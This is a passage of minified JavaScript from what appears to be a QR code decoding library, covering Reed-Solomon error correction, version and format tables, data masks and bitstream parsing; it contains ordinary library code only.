r=0;r<this.bits.length;r++)this.bits[r]=0;this.__defineGetter__("Width",function(){return this.width}),this.__defineGetter__("Height",function(){return this.height}),this.__defineGetter__("Dimension",function(){if(this.width!=this.height)throw"Can't call getDimension() on a non-square matrix";return this.width}),this.get_Renamed=function(e,t){var n=t*this.rowSize+(e>>5);return 0!=(1&f(this.bits[n],31&e))},this.set_Renamed=function(e,t){var n=t*this.rowSize+(e>>5);this.bits[n]|=1<<(31&e)},this.flip=function(e,t){var n=t*this.rowSize+(e>>5);this.bits[n]^=1<<(31&e)},this.clear=function(){for(var e=this.bits.length,t=0;e>t;t++)this.bits[t]=0},this.setRegion=function(e,t,n,r){if(0>t||0>e)throw"Left and top must be nonnegative";if(1>r||1>n)throw"Height and width must be at least 1";var i=e+n,o=t+r;if(o>this.height||i>this.width)throw"The region must fit inside the matrix";for(var a=t;o>a;a++)for(var s=a*this.rowSize,h=e;i>h;h++)this.bits[s+(h>>5)]|=1<<(31&h)}}function c(e,t){this.numDataCodewords=e,this.codewords=t,this.__defineGetter__("NumDataCodewords",function(){return this.numDataCodewords}),this.__defineGetter__("Codewords",function(){return this.codewords})}function d(e,t){if(null==t||0==t.length)throw"System.ArgumentException";this.field=e;var n=t.length;if(n>1&&0==t[0]){for(var r=1;n>r&&0==t[r];)r++;if(r==n)this.coefficients=e.Zero.coefficients;else{this.coefficients=new Array(n-r);for(var i=0;i<this.coefficients.length;i++)this.coefficients[i]=0;for(var o=0;o<this.coefficients.length;o++)this.coefficients[o]=t[r+o]}}else this.coefficients=t;this.__defineGetter__("Zero",function(){return 0==this.coefficients[0]}),this.__defineGetter__("Degree",function(){return this.coefficients.length-1}),this.__defineGetter__("Coefficients",function(){return this.coefficients}),this.getCoefficient=function(e){return this.coefficients[this.coefficients.length-1-e]},this.evaluateAt=function(e){if(0==e)return this.getCoefficient(0);var t=this.coefficients.length;if(1==e){for(var n=0,r=0;t>r;r++)n=u.addOrSubtract(n,this.coefficients[r]);return n}var i=this.coefficients[0];for(r=1;t>r;r++)i=u.addOrSubtract(this.field.multiply(e,i),this.coefficients[r]);return i},this.addOrSubtract=function(t){if(this.field!=t.field)throw"GF256Polys do not have same GF256 field";if(this.Zero)return t;if(t.Zero)return this;var n=this.coefficients,r=t.coefficients;if(n.length>r.length){var i=n;n=r,r=i}for(var o=new Array(r.length),a=r.length-n.length,s=0;a>s;s++)o[s]=r[s];for(var h=a;h<r.length;h++)o[h]=u.addOrSubtract(n[h-a],r[h]);return new d(e,o)},this.multiply1=function(e){if(this.field!=e.field)throw"GF256Polys do not have same GF256 field";if(this.Zero||e.Zero)return this.field.Zero;for(var t=this.coefficients,n=t.length,r=e.coefficients,i=r.length,o=new Array(n+i-1),a=0;n>a;a++)for(var s=t[a],h=0;i>h;h++)o[a+h]=u.addOrSubtract(o[a+h],this.field.multiply(s,r[h]));return new d(this.field,o)},this.multiply2=function(e){if(0==e)return this.field.Zero;if(1==e)return this;for(var t=this.coefficients.length,n=new Array(t),r=0;t>r;r++)n[r]=this.field.multiply(this.coefficients[r],e);return new d(this.field,n)},this.multiplyByMonomial=function(e,t){if(0>e)throw"System.ArgumentException";if(0==t)return this.field.Zero;for(var n=this.coefficients.length,r=new Array(n+e),i=0;i<r.length;i++)r[i]=0;for(i=0;n>i;i++)r[i]=this.field.multiply(this.coefficients[i],t);return new d(this.field,r)},this.divide=function(e){if(this.field!=e.field)throw"GF256Polys do not have same GF256 field";if(e.Zero)throw"Divide by 0";for(var t=this.field.Zero,n=this,r=e.getCoefficient(e.Degree),i=this.field.inverse(r);n.Degree>=e.Degree&&!n.Zero;){var o=n.Degree-e.Degree,a=this.field.multiply(n.getCoefficient(n.Degree),i),s=e.multiplyByMonomial(o,a),h=this.field.buildMonomial(o,a);t=t.addOrSubtract(h),n=n.addOrSubtract(s)}return new Array(t,n)}}function u(e){this.expTable=new Array(256),this.logTable=new Array(256);for(var t=1,n=0;256>n;n++)this.expTable[n]=t,(t<<=1)>=256&&(t^=e);for(n=0;255>n;n++)this.logTable[this.expTable[n]]=n;var r=new Array(1);r[0]=0,this.zero=new d(this,new Array(r));var i=new Array(1);i[0]=1,this.one=new d(this,new Array(i)),this.__defineGetter__("Zero",function(){return this.zero}),this.__defineGetter__("One",function(){return this.one}),this.buildMonomial=function(e,t){if(0>e)throw"System.ArgumentException";if(0==t)return zero;for(var n=new Array(e+1),r=0;r<n.length;r++)n[r]=0;return n[0]=t,new d(this,n)},this.exp=function(e){return this.expTable[e]},this.log=function(e){if(0==e)throw"System.ArgumentException";return this.logTable[e]},this.inverse=function(e){if(0==e)throw"System.ArithmeticException";return this.expTable[255-this.logTable[e]]},this.multiply=function(e,t){return 0==e||0==t?0:1==e?t:1==t?e:this.expTable[(this.logTable[e]+this.logTable[t])%255]}}function f(e,t){return e>=0?e>>t:(e>>t)+(2<<~t)}function l(e,t,n){this.x=e,this.y=t,this.count=1,this.estimatedModuleSize=n,this.__defineGetter__("EstimatedModuleSize",function(){return this.estimatedModuleSize}),this.__defineGetter__("Count",function(){return this.count}),this.__defineGetter__("X",function(){return Math.floor(this.x)}),this.__defineGetter__("Y",function(){return Math.floor(this.y)}),this.incrementCount=function(){this.count++},this.aboutEquals=function(e,t,n){if(Math.abs(t-this.y)<=e&&Math.abs(n-this.x)<=e){var r=Math.abs(e-this.estimatedModuleSize);return 1>=r||r/this.estimatedModuleSize<=1}return!1}}GridSampler={},GridSampler.checkAndNudgePoints=function(e,t){for(var n=qrcode.width,r=qrcode.height,i=!0,o=0;o<t.length&&i;o+=2){var a=Math.floor(t[o]),s=Math.floor(t[o+1]);if(-1>a||a>n||-1>s||s>r)throw"Error.checkAndNudgePoints ";i=!1,-1==a?(t[o]=0,i=!0):a==n&&(t[o]=n-1,i=!0),-1==s?(t[o+1]=0,i=!0):s==r&&(t[o+1]=r-1,i=!0)}i=!0;for(o=t.length-2;o>=0&&i;o-=2){a=Math.floor(t[o]),s=Math.floor(t[o+1]);if(-1>a||a>n||-1>s||s>r)throw"Error.checkAndNudgePoints ";i=!1,-1==a?(t[o]=0,i=!0):a==n&&(t[o]=n-1,i=!0),-1==s?(t[o+1]=0,i=!0):s==r&&(t[o+1]=r-1,i=!0)}},GridSampler.sampleGrid3=function(e,t,n){for(var r=new h(t),i=new Array(t<<1),o=0;t>o;o++){for(var a=i.length,s=o+.5,c=0;a>c;c+=2)i[c]=.5+(c>>1),i[c+1]=s;n.transformPoints1(i),GridSampler.checkAndNudgePoints(e,i);try{for(c=0;a>c;c+=2){var d=4*Math.floor(i[c])+Math.floor(i[c+1])*qrcode.width*4,u=e[Math.floor(i[c])+qrcode.width*Math.floor(i[c+1])];qrcode.imagedata.data[d]=u?255:0,qrcode.imagedata.data[d+1]=u?255:0,qrcode.imagedata.data[d+2]=0,qrcode.imagedata.data[d+3]=255,u&&r.set_Renamed(c>>1,o)}}catch(e){throw"Error.checkAndNudgePoints"}}return r},GridSampler.sampleGridx=function(e,t,n,r,o,a,s,h,c,d,u,f,l,w,_,g,E,m){var p=i.quadrilateralToQuadrilateral(n,r,o,a,s,h,c,d,u,f,l,w,_,g,E,m);return GridSampler.sampleGrid3(e,t,p)},r.VERSION_DECODE_INFO=new Array(31892,34236,39577,42195,48118,51042,55367,58893,63784,68472,70749,76311,79154,84390,87683,92361,96236,102084,102881,110507,110734,117786,119615,126325,127568,133589,136944,141498,145311,150283,152622,158308,161089,167017),r.VERSIONS=new Array(new r(1,new Array,new n(7,new t(1,19)),new n(10,new t(1,16)),new n(13,new t(1,13)),new n(17,new t(1,9))),new r(2,new Array(6,18),new n(10,new t(1,34)),new n(16,new t(1,28)),new n(22,new t(1,22)),new n(28,new t(1,16))),new r(3,new Array(6,22),new n(15,new t(1,55)),new n(26,new t(1,44)),new n(18,new t(2,17)),new n(22,new t(2,13))),new r(4,new Array(6,26),new n(20,new t(1,80)),new n(18,new t(2,32)),new n(26,new t(2,24)),new n(16,new t(4,9))),new r(5,new Array(6,30),new n(26,new t(1,108)),new n(24,new t(2,43)),new n(18,new t(2,15),new t(2,16)),new n(22,new t(2,11),new t(2,12))),new r(6,new Array(6,34),new n(18,new t(2,68)),new n(16,new t(4,27)),new n(24,new t(4,19)),new n(28,new t(4,15))),new r(7,new Array(6,22,38),new n(20,new t(2,78)),new n(18,new t(4,31)),new n(18,new t(2,14),new t(4,15)),new n(26,new t(4,13),new t(1,14))),new r(8,new Array(6,24,42),new n(24,new t(2,97)),new n(22,new t(2,38),new t(2,39)),new n(22,new t(4,18),new t(2,19)),new n(26,new t(4,14),new t(2,15))),new r(9,new Array(6,26,46),new n(30,new t(2,116)),new n(22,new t(3,36),new t(2,37)),new n(20,new t(4,16),new t(4,17)),new n(24,new t(4,12),new t(4,13))),new r(10,new Array(6,28,50),new n(18,new t(2,68),new t(2,69)),new n(26,new t(4,43),new t(1,44)),new n(24,new t(6,19),new t(2,20)),new n(28,new t(6,15),new t(2,16))),new r(11,new Array(6,30,54),new n(20,new t(4,81)),new n(30,new t(1,50),new t(4,51)),new n(28,new t(4,22),new t(4,23)),new n(24,new t(3,12),new t(8,13))),new r(12,new Array(6,32,58),new n(24,new t(2,92),new t(2,93)),new n(22,new t(6,36),new t(2,37)),new n(26,new t(4,20),new t(6,21)),new n(28,new t(7,14),new t(4,15))),new r(13,new Array(6,34,62),new n(26,new t(4,107)),new n(22,new t(8,37),new t(1,38)),new n(24,new t(8,20),new t(4,21)),new n(22,new t(12,11),new t(4,12))),new r(14,new Array(6,26,46,66),new n(30,new t(3,115),new t(1,116)),new n(24,new t(4,40),new t(5,41)),new n(20,new t(11,16),new t(5,17)),new n(24,new t(11,12),new t(5,13))),new r(15,new Array(6,26,48,70),new n(22,new t(5,87),new t(1,88)),new n(24,new t(5,41),new t(5,42)),new n(30,new t(5,24),new t(7,25)),new n(24,new t(11,12),new t(7,13))),new r(16,new Array(6,26,50,74),new n(24,new t(5,98),new t(1,99)),new n(28,new t(7,45),new t(3,46)),new n(24,new t(15,19),new t(2,20)),new n(30,new t(3,15),new t(13,16))),new r(17,new Array(6,30,54,78),new n(28,new t(1,107),new t(5,108)),new n(28,new t(10,46),new t(1,47)),new n(28,new t(1,22),new t(15,23)),new n(28,new t(2,14),new t(17,15))),new r(18,new Array(6,30,56,82),new n(30,new t(5,120),new t(1,121)),new n(26,new t(9,43),new t(4,44)),new n(28,new t(17,22),new t(1,23)),new n(28,new t(2,14),new t(19,15))),new r(19,new Array(6,30,58,86),new n(28,new t(3,113),new t(4,114)),new n(26,new t(3,44),new t(11,45)),new n(26,new t(17,21),new t(4,22)),new n(26,new t(9,13),new t(16,14))),new r(20,new Array(6,34,62,90),new n(28,new t(3,107),new t(5,108)),new n(26,new t(3,41),new t(13,42)),new n(30,new t(15,24),new t(5,25)),new n(28,new t(15,15),new t(10,16))),new r(21,new Array(6,28,50,72,94),new n(28,new t(4,116),new t(4,117)),new n(26,new t(17,42)),new n(28,new t(17,22),new t(6,23)),new n(30,new t(19,16),new t(6,17))),new r(22,new Array(6,26,50,74,98),new n(28,new t(2,111),new t(7,112)),new n(28,new t(17,46)),new n(30,new t(7,24),new t(16,25)),new n(24,new t(34,13))),new r(23,new Array(6,30,54,74,102),new n(30,new t(4,121),new t(5,122)),new n(28,new t(4,47),new t(14,48)),new n(30,new t(11,24),new t(14,25)),new n(30,new t(16,15),new t(14,16))),new r(24,new Array(6,28,54,80,106),new n(30,new t(6,117),new t(4,118)),new n(28,new t(6,45),new t(14,46)),new n(30,new t(11,24),new t(16,25)),new n(30,new t(30,16),new t(2,17))),new r(25,new Array(6,32,58,84,110),new n(26,new t(8,106),new t(4,107)),new n(28,new t(8,47),new t(13,48)),new n(30,new t(7,24),new t(22,25)),new n(30,new t(22,15),new t(13,16))),new r(26,new Array(6,30,58,86,114),new n(28,new t(10,114),new t(2,115)),new n(28,new t(19,46),new t(4,47)),new n(28,new t(28,22),new t(6,23)),new n(30,new t(33,16),new t(4,17))),new r(27,new Array(6,34,62,90,118),new n(30,new t(8,122),new t(4,123)),new n(28,new t(22,45),new t(3,46)),new n(30,new t(8,23),new t(26,24)),new n(30,new t(12,15),new t(28,16))),new r(28,new Array(6,26,50,74,98,122),new n(30,new t(3,117),new t(10,118)),new n(28,new t(3,45),new t(23,46)),new n(30,new t(4,24),new t(31,25)),new n(30,new t(11,15),new t(31,16))),new r(29,new Array(6,30,54,78,102,126),new n(30,new t(7,116),new t(7,117)),new n(28,new t(21,45),new t(7,46)),new n(30,new t(1,23),new t(37,24)),new n(30,new t(19,15),new t(26,16))),new r(30,new Array(6,26,52,78,104,130),new n(30,new t(5,115),new t(10,116)),new n(28,new t(19,47),new t(10,48)),new n(30,new t(15,24),new t(25,25)),new n(30,new t(23,15),new t(25,16))),new r(31,new Array(6,30,56,82,108,134),new n(30,new t(13,115),new t(3,116)),new n(28,new t(2,46),new t(29,47)),new n(30,new t(42,24),new t(1,25)),new n(30,new t(23,15),new t(28,16))),new r(32,new Array(6,34,60,86,112,138),new n(30,new t(17,115)),new n(28,new t(10,46),new t(23,47)),new n(30,new t(10,24),new t(35,25)),new n(30,new t(19,15),new t(35,16))),new r(33,new Array(6,30,58,86,114,142),new n(30,new t(17,115),new t(1,116)),new n(28,new t(14,46),new t(21,47)),new n(30,new t(29,24),new t(19,25)),new n(30,new t(11,15),new t(46,16))),new r(34,new Array(6,34,62,90,118,146),new n(30,new t(13,115),new t(6,116)),new n(28,new t(14,46),new t(23,47)),new n(30,new t(44,24),new t(7,25)),new n(30,new t(59,16),new t(1,17))),new r(35,new Array(6,30,54,78,102,126,150),new n(30,new t(12,121),new t(7,122)),new n(28,new t(12,47),new t(26,48)),new n(30,new t(39,24),new t(14,25)),new n(30,new t(22,15),new t(41,16))),new r(36,new Array(6,24,50,76,102,128,154),new n(30,new t(6,121),new t(14,122)),new n(28,new t(6,47),new t(34,48)),new n(30,new t(46,24),new t(10,25)),new n(30,new t(2,15),new t(64,16))),new r(37,new Array(6,28,54,80,106,132,158),new n(30,new t(17,122),new t(4,123)),new n(28,new t(29,46),new t(14,47)),new n(30,new t(49,24),new t(10,25)),new n(30,new t(24,15),new t(46,16))),new r(38,new Array(6,32,58,84,110,136,162),new n(30,new t(4,122),new t(18,123)),new n(28,new t(13,46),new t(32,47)),new n(30,new t(48,24),new t(14,25)),new n(30,new t(42,15),new t(32,16))),new r(39,new Array(6,26,54,82,110,138,166),new n(30,new t(20,117),new t(4,118)),new n(28,new t(40,47),new t(7,48)),new n(30,new t(43,24),new t(22,25)),new n(30,new t(10,15),new t(67,16))),new r(40,new Array(6,30,58,86,114,142,170),new n(30,new t(19,118),new t(6,119)),new n(28,new t(18,47),new t(31,48)),new n(30,new t(34,24),new t(34,25)),new n(30,new t(20,15),new t(61,16)))),r.getVersionForNumber=function(e){if(1>e||e>40)throw"ArgumentException";return r.VERSIONS[e-1]},r.getProvisionalVersionForDimension=function(e){if(e%4!=1)throw"Error getProvisionalVersionForDimension";try{return r.getVersionForNumber(e-17>>2)}catch(e){throw"Error getVersionForNumber"}},r.decodeVersionInformation=function(e){for(var t=4294967295,n=0,i=0;i<r.VERSION_DECODE_INFO.length;i++){var o=r.VERSION_DECODE_INFO[i];if(o==e)return this.getVersionForNumber(i+7);var s=a.numBitsDiffering(e,o);t>s&&(n=i+7,t=s)}return 3>=t?this.getVersionForNumber(n):null},i.quadrilateralToQuadrilateral=function(e,t,n,r,i,o,a,s,h,c,d,u,f,l,w,_){var g=this.quadrilateralToSquare(e,t,n,r,i,o,a,s);return this.squareToQuadrilateral(h,c,d,u,f,l,w,_).times(g)},i.squareToQuadrilateral=function(e,t,n,r,o,a,s,h){return dy2=h-a,dy3=t-r+a-h,0==dy2&&0==dy3?new i(n-e,o-n,e,r-t,a-r,t,0,0,1):(dx1=n-o,dx2=s-o,dx3=e-n+o-s,dy1=r-a,denominator=dx1*dy2-dx2*dy1,a13=(dx3*dy2-dx2*dy3)/denominator,a23=(dx1*dy3-dx3*dy1)/denominator,new i(n-e+a13*n,s-e+a23*s,e,r-t+a13*r,h-t+a23*h,t,a13,a23,1))},i.quadrilateralToSquare=function(e,t,n,r,i,o,a,s){return this.squareToQuadrilateral(e,t,n,r,i,o,a,s).buildAdjoint()};var w=new Array(new Array(21522,0),new Array(20773,1),new Array(24188,2),new Array(23371,3),new Array(17913,4),new Array(16590,5),new Array(20375,6),new Array(19104,7),new Array(30660,8),new Array(29427,9),new Array(32170,10),new Array(30877,11),new Array(26159,12),new Array(25368,13),new Array(27713,14),new Array(26998,15),new Array(5769,16),new Array(5054,17),new Array(7399,18),new Array(6608,19),new Array(1890,20),new Array(597,21),new Array(3340,22),new Array(2107,23),new Array(13663,24),new Array(12392,25),new Array(16177,26),new Array(14854,27),new Array(9396,28),new Array(8579,29),new Array(11994,30),new Array(11245,31)),_=new Array(0,1,1,2,1,2,2,3,1,2,2,3,2,3,3,4);a.numBitsDiffering=function(e,t){return _[15&(e^=t)]+_[15&f(e,4)]+_[15&f(e,8)]+_[15&f(e,12)]+_[15&f(e,16)]+_[15&f(e,20)]+_[15&f(e,24)]+_[15&f(e,28)]},a.decodeFormatInformation=function(e){var t=a.doDecodeFormatInformation(e);return null!=t?t:a.doDecodeFormatInformation(21522^e)},a.doDecodeFormatInformation=function(e){for(var t=4294967295,n=0,r=0;r<w.length;r++){var i=w[r],o=i[0];if(o==e)return new a(i[1]);var s=this.numBitsDiffering(e,o);t>s&&(n=i[1],t=s)}return 3>=t?new a(n):null},s.forBits=function(e){if(0>e||e>=C.length)throw"ArgumentException";return C[e]};var g=new s(0,1,"L"),E=new s(1,0,"M"),m=new s(2,3,"Q"),A=new s(3,2,"H"),C=new Array(E,g,A,m);c.getDataBlocks=function(e,t,n){if(e.length!=t.TotalCodewords)throw"ArgumentException";for(var r=t.getECBlocksForLevel(n),i=0,o=r.getECBlocks(),a=0;a<o.length;a++)i+=o[a].Count;for(var s=new Array(i),h=0,d=0;d<o.length;d++){var u=o[d];for(a=0;a<u.Count;a++){var f=u.DataCodewords,l=r.ECCodewordsPerBlock+f;s[h++]=new c(f,new Array(l))}}for(var w=s[0].codewords.length,_=s.length-1;_>=0;){if(s[_].codewords.length==w)break;_--}_++;var g=w-r.ECCodewordsPerBlock,E=0;for(a=0;g>a;a++)for(d=0;h>d;d++)s[d].codewords[a]=e[E++];for(d=_;h>d;d++)s[d].codewords[g]=e[E++];var m=s[0].codewords.length;for(a=g;m>a;a++)for(d=0;h>d;d++){var p=_>d?a:a+1;s[d].codewords[p]=e[E++]}return s},DataMask={},DataMask.forReference=function(e){if(0>e||e>7)throw"System.ArgumentException";return DataMask.DATA_MASKS[e]},DataMask.DATA_MASKS=new Array(new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return 0==(e+t&1)}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return 0==(1&e)}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return t%3==0}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return(e+t)%3==0}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return 0==(f(e,1)+t/3&1)}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){var n=e*t;return(1&n)+n%3==0}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){var n=e*t;return 0==((1&n)+n%3&1)}},new function(){this.unmaskBitMatrix=function(e,t){for(var n=0;t>n;n++)for(var r=0;t>r;r++)this.isMasked(n,r)&&e.flip(r,n)},this.isMasked=function(e,t){return 0==((e+t&1)+e*t%3&1)}}),u.QR_CODE_FIELD=new u(285),u.DATA_MATRIX_FIELD=new u(301),u.addOrSubtract=function(e,t){return e^t},Decoder={},Decoder.rsDecoder=new function(e){this.field=e,this.decode=function(e,t){for(var n=new d(this.field,e),r=new Array(t),i=0;i<r.length;i++)r[i]=0;var o=!0;for(i=0;t>i;i++){var a=n.evaluateAt(this.field.exp(i));r[r.length-1-i]=a,0!=a&&(o=!1)}if(!o){var s=new d(this.field,r),h=this.runEuclideanAlgorithm(this.field.buildMonomial(t,1),s,t),c=h[0],f=h[1],l=this.findErrorLocations(c),w=this.findErrorMagnitudes(f,l,!1);for(i=0;i<l.length;i++){var _=e.length-1-this.field.log(l[i]);if(0>_)throw"ReedSolomonException Bad error location";e[_]=u.addOrSubtract(e[_],w[i])}}},this.runEuclideanAlgorithm=function(e,t,n){if(e.Degree<t.Degree){var r=e;e=t,t=r}for(var i=e,o=t,a=this.field.One,s=this.field.Zero,h=this.field.Zero,c=this.field.One;o.Degree>=Math.floor(n/2);){var d=i,u=a,f=h;if(a=s,h=c,(i=o).Zero)throw"r_{i-1} was zero";o=d;for(var l=this.field.Zero,w=i.getCoefficient(i.Degree),_=this.field.inverse(w);o.Degree>=i.Degree&&!o.Zero;){var g=o.Degree-i.Degree,E=this.field.multiply(o.getCoefficient(o.Degree),_);l=l.addOrSubtract(this.field.buildMonomial(g,E)),o=o.addOrSubtract(i.multiplyByMonomial(g,E))}s=l.multiply1(a).addOrSubtract(u),c=l.multiply1(h).addOrSubtract(f)}var m=c.getCoefficient(0);if(0==m)throw"ReedSolomonException sigmaTilde(0) was zero";var p=this.field.inverse(m),A=c.multiply2(p),C=o.multiply2(p);return new Array(A,C)},this.findErrorLocations=function(e){var t=e.Degree;if(1==t)return new Array(e.getCoefficient(1));for(var n=new Array(t),r=0,i=1;256>i&&t>r;i++)0==e.evaluateAt(i)&&(n[r]=this.field.inverse(i),r++);if(r!=t)throw"Error locator degree does not match number of roots";return n},this.findErrorMagnitudes=function(e,t,n){for(var r=t.length,i=new Array(r),o=0;r>o;o++){for(var a=this.field.inverse(t[o]),s=1,h=0;r>h;h++)o!=h&&(s=this.field.multiply(s,u.addOrSubtract(1,this.field.multiply(t[h],a))));i[o]=this.field.multiply(e.evaluateAt(a),this.field.inverse(s)),n&&(i[o]=this.field.multiply(i[o],a))}return i}}(u.QR_CODE_FIELD),Decoder.correctErrors=function(e,t){for(var n=e.length,r=new Array(n),i=0;n>i;i++)r[i]=255&e[i];var o=e.length-t;try{Decoder.rsDecoder.decode(r,o)}catch(e){throw e}for(i=0;t>i;i++)e[i]=r[i]},Decoder.decode=function(e){for(var t=new function(e){var t=e.Dimension;if(21>t||1!=(3&t))throw"Error BitMatrixParser";this.bitMatrix=e,this.parsedVersion=null,this.parsedFormatInfo=null,this.copyBit=function(e,t,n){return this.bitMatrix.get_Renamed(e,t)?n<<1|1:n<<1},this.readFormatInformation=function(){if(null!=this.parsedFormatInfo)return this.parsedFormatInfo;for(var e=0,t=0;6>t;t++)e=this.copyBit(t,8,e);e=this.copyBit(7,8,e),e=this.copyBit(8,8,e),e=this.copyBit(8,7,e);for(var n=5;n>=0;n--)e=this.copyBit(8,n,e);if(this.parsedFormatInfo=a.decodeFormatInformation(e),null!=this.parsedFormatInfo)return this.parsedFormatInfo;var r=this.bitMatrix.Dimension;e=0;var i=r-8;for(t=r-1;t>=i;t--)e=this.copyBit(t,8,e);for(n=r-7;r>n;n++)e=this.copyBit(8,n,e);if(this.parsedFormatInfo=a.decodeFormatInformation(e),null!=this.parsedFormatInfo)return this.parsedFormatInfo;throw"Error readFormatInformation"},this.readVersion=function(){if(null!=this.parsedVersion)return this.parsedVersion;var e=this.bitMatrix.Dimension,t=e-17>>2;if(6>=t)return r.getVersionForNumber(t);for(var n=0,i=e-11,o=5;o>=0;o--)for(var a=e-9;a>=i;a--)n=this.copyBit(a,o,n);if(this.parsedVersion=r.decodeVersionInformation(n),null!=this.parsedVersion&&this.parsedVersion.DimensionForVersion==e)return this.parsedVersion;for(n=0,a=5;a>=0;a--)for(o=e-9;o>=i;o--)n=this.copyBit(a,o,n);if(this.parsedVersion=r.decodeVersionInformation(n),null!=this.parsedVersion&&this.parsedVersion.DimensionForVersion==e)return this.parsedVersion;throw"Error readVersion"},this.readCodewords=function(){var e=this.readFormatInformation(),t=this.readVersion(),n=DataMask.forReference(e.DataMask),r=this.bitMatrix.Dimension;n.unmaskBitMatrix(this.bitMatrix,r);for(var i=t.buildFunctionPattern(),o=!0,a=new Array(t.TotalCodewords),s=0,h=0,c=0,d=r-1;d>0;d-=2){6==d&&d--;for(var u=0;r>u;u++)for(var f=o?r-1-u:u,l=0;2>l;l++)i.get_Renamed(d-l,f)||(c++,h<<=1,this.bitMatrix.get_Renamed(d-l,f)&&(h|=1),8==c&&(a[s++]=h,c=0,h=0));o^=!0}if(s!=t.TotalCodewords)throw"Error readCodewords";return a}}(e),n=t.readVersion(),i=t.readFormatInformation().ErrorCorrectionLevel,o=t.readCodewords(),s=c.getDataBlocks(o,n,i),h=0,d=0;d<s.length;d++)h+=s[d].NumDataCodewords;for(var u=new Array(h),f=0,l=0;l<s.length;l++){var w=s[l],_=w.Codewords,g=w.NumDataCodewords;Decoder.correctErrors(_,g);for(d=0;g>d;d++)u[f++]=_[d]}return new function(e,t,n){this.blockPointer=0,this.bitPointer=7,this.dataLength=0,this.blocks=e,this.numErrorCorrectionCode=n,9>=t?this.dataLengthMode=0:t>=10&&26>=t?this.dataLengthMode=1:t>=27&&40>=t&&(this.dataLengthMode=2),this.getNextBits=function(e){var t=0;if(e<this.bitPointer+1){for(var n=0,r=0;e>r;r++)n+=1<<r;return n<<=this.bitPointer-e+1,t=(this.blocks[this.blockPointer]&n)>>this.bitPointer-e+1,this.bitPointer-=e,t}if(e<this.bitPointer+1+8){var i=0;for(r=0;r<this.bitPointer+1;r++)i+=1<<r;return t=(this.blocks[this.blockPointer]&i)<<e-(this.bitPointer+1),this.blockPointer++,t+=this.blocks[this.blockPointer]>>8-(e-(this.bitPointer+1)),this.bitPointer=this.bitPointer-e%8,this.bitPointer<0&&(this.bitPointer=8+this.bitPointer),t}if(e<this.bitPointer+1+16){i=0;var o=0;for(r=0;r<this.bitPointer+1;r++)i+=1<<r;var a=(this.blocks[this.blockPointer]&i)<<e-(this.bitPointer+1);this.blockPointer++;var s=this.blocks[this.blockPointer]<<e-(this.bitPointer+1+8);for(this.blockPointer++,r=0;r<e-(this.bitPointer+1+8);r++)o+=1<<r;return o<<=8-(e-(this.bitPointer+1+8)),t=a+s+((this.blocks[this.blockPointer]&o)>>8-(e-(this.bitPointer+1+8))),this.bitPointer=this.bitPointer-(e-8)%8,this.bitPointer<0&&(this.bitPointer=8+this.bitPointer),t}return 0},this.NextMode=function(){return this.blockPointer>this.blocks.length-this.numErrorCorrectionCode-2?0:this.getNextBits(4)},this.getDataLength=function(e){for(var t=0;e>>t!=1;)t++;return this.getNextBits(qrcode.sizeOfDataLengthInfo[this.dataLengthMode][t])},this.getRomanAndFigureString=function(e){var t=e,n=0,r="",i=new Array("0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":");do{if(t>1){var o=(n=this.getNextBits(11))%45;r+=i[Math.floor(n/45)],r+=i[o],t-=2}else 1==t&&(r+=i[n=this.getNextBits(6)],t-=1)}while(t>0);return r},this.getFigureString=function(e){var t=e,n=0,r="";do{t>=3?(100>(n=this.getNextBits(10))&&(r+="0"),10>n&&(r+="0"),t-=3):2==t?(10>(n=this.getNextBits(7))&&(r+="0"),t-=2):1==t&&(n=this.getNextBits(4),t-=1),r+=n}while(t>0);return r},this.get8bitByteArray=function(e){var t=e,n=0,r=new Array;do{n=this.getNextBits(8),r.push(n),t--}while(t>0);return r},this.getKanjiString=function(e){var t=e,n=0,r="";do{var i,o=((n=getNextBits(13))/192<<8)+n%192;i=40956>=o+33088?o+33088:o+49472,r+=String.fromCharCode(i),t--}while(t>0);return r},this.__defineGetter__("DataByte",function(){for(var e=new Array;;){var t=this.NextMode();if(0==t){if(e.length>0)break;throw"Empty data block"}if(1!=t&&2!=t&&4!=t&&8!=t)throw"Invalid mode: "+t+" in (block:"+this.blockPointer+" bit:"+this.bitPointer+")";if(dataLength=this.getDataLength(t),dataLength<1)throw"Invalid data length: "+dataLength;switch(t){case 1:for(var n=this.getFigureString(dataLength),r=new Array(n.length),i=0;i<n.length;i++)r[i]=n.charCodeAt(i);e.push(r);break;case 2:for(n=this.getRomanAndFigureString(dataLength),r=new Array(n.length),i=0;i<n.length;i++)r[i]=n.charCodeAt(i);e.push(r);break;case 4:var o=this.get8bitByteArray(dataLength);e.push(o);break;case 8:n=this.getKanjiString(dataLength),e.push(n)}}return e})}(u,n.VersionNumber,i.Bits)},qrcode={},qrcode.imagedata=null,qrcode.width=0,qrcode.height=0,qrcode.qrCodeSymbol=null,qrcode.debug=!1,qrcode.maxImgSize=1048576,qrcode.sizeOfDataLengthInfo=[[10,9,8,8],[12,11,16,10],[14,13,16,12]],qrcode.callback=null,qrcode.decode=function(e){if(0==arguments.length){var t=document.getElementById("qr-canvas"),n=t.getContext("2d");return 